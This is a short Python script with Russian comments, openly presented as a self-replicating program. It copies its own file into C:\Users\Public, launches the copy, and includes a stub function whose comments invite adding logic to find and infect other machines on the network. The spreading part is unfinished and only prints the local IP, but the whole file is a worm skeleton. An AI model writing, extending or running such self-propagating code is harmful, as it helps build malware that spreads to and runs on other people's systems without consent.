import shutil
import os
import time
import sys
import socket
from pathlib import Path

# Путь к текущей директории
current_file = sys.argv[0]

# Путь к папке назначения для копирования
destination_folder = r"C:\Users\Public"  # Папка, куда будет скопирована программа

def replicate_program():
    try:
        # Создание копии программы в указанной папке
        destination_file = os.path.join(destination_folder, os.path.basename(current_file))
        shutil.copy(current_file, destination_file)
        print(f"Программа скопирована в {destination_file}")

        # Запуск новой копии программы на другом компьютере (или в той же системе)
        os.startfile(destination_file)
    except Exception as e:
        print(f"Ошибка: {e}")

# Функция для проверки сетевых устройств (опционально, если нужно распространяться по сети)
def spread_network():
    # Пример проверки доступных устройств в сети
    host = socket.gethostbyname(socket.gethostname())  # IP текущего устройства
    print(f"Текущий IP: {host}")
    
    # Здесь можно добавить логику для поиска и подключения к другим устройствам в сети
    # Для примера будет просто выводить IP-адреса сетевых устройств
    # или проверять доступность на других устройствах в сети

if __name__ == "__main__":
    # Саморазмножение (копирование и запуск программы)
    replicate_program()

    # Опционально: попытка распространиться по сети
    spread_network()

    # Подождем немного и повторим попытку
    time.sleep(5)
